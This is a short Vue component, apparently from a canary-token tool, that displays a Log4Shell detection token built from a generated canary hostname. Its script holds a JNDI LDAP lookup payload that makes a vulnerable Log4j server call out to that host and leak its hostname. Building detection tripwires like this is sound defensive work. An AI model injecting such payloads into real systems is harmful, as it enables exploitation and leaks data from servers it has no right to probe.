<template>
  <div v-if="!tokenUsage">Error loading</div>
  <TokenDisplay
    v-else
    :token-usage="tokenUsage"
  />
</template>

<script lang="ts" setup>
import { ref } from 'vue';
import TokenDisplay from './TokenDisplay.vue';
import type { ManageTokenBackendType } from '@/components/tokens/types.ts';

const props = defineProps<{
  tokenBackendResponse: ManageTokenBackendType;
}>();

const hostname = ref(props.tokenBackendResponse.canarydrop.generated_hostname);
const tokenUsage = ref(`\${jndi:ldap://x\${hostName}.L4J.${hostname.value}/a}`);
</script>
